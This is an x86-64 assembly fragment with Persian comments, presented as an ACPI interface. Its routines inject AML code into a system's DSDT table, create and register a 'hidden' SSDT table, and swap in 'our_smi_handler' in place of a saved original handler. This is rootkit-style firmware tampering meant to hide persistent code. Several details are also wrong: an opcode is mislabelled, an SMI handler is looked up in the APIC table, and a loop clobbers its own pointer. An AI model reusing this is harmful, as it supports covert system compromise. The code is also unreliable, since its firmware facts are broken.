; رابط پیشرفته ACPI
section .text

; دستکاری جدول DSDT
modify_dsdt:
    ; rdi = آدرس DSDT
    ; rsi = کد AML جدید
    ; rdx = اندازه کد جدید
    
    ; یافتن محل تزریق
    mov rcx, [rdi + 4]  ; طول جدول
    sub rcx, 36
    
.find_injection_point:
    mov al, [rdi + rcx]
    cmp al, 0x5B  ; AML_RETURN_OP
    je .found
    dec rcx
    jnz .find_injection_point
    
.found:
    ; تزریق کد جدید
    lea rdi, [rdi + rcx]
    mov rcx, rdx
    rep movsb
    
    ; به‌روزرسانی چک‌سام
    call update_dsdt_checksum
    ret

; ایجاد جدول SSDT مخفی
create_hidden_ssdt:
    ; تخصیص حافظه برای جدول جدید
    mov rdi, SSDT_SIZE
    call allocate_acpi_memory
    mov [hidden_ssdt], rax
    
    ; ساخت هدر SSDT
    mov dword [rax], 'SSDT'  ; امضا
    mov dword [rax+4], SSDT_SIZE
    mov byte [rax+8], 1      ; Revision
    
    ; کپی کد AML
    lea rsi, [hidden_aml_code]
    lea rdi, [rax+36]
    mov rcx, hidden_aml_size
    rep movsb
    
    ; محاسبه چک‌سام
    call update_checksum
    
    ; افزودن به سیستم
    call add_acpi_table
    ret

; تزریق کد SMI Handler
inject_smi_handler:
    ; یافتن کنترلر SMI
    mov rdi, 'APIC'
    call find_acpi_table
    test rax, rax
    jz .exit
    
    ; یافتن ورودی SCI_INT
    mov rcx, [rax + 4]  ; طول جدول
    add rax, 44         ; شروع ورودی‌ها
    
.find_entry:
    mov al, [rax]
    cmp al, 0x2B        ; نوع SCI_INT
    je .found
    add rax, [rax+1]    ; حرکت به ورودی بعدی
    jmp .find_entry
    
.found:
    ; جایگزینی آدرس هندلر
    mov rdi, [rax+8]
    mov [original_smi_handler], rdi
    mov [rax+8], our_smi_handler
.exit:
    ret
    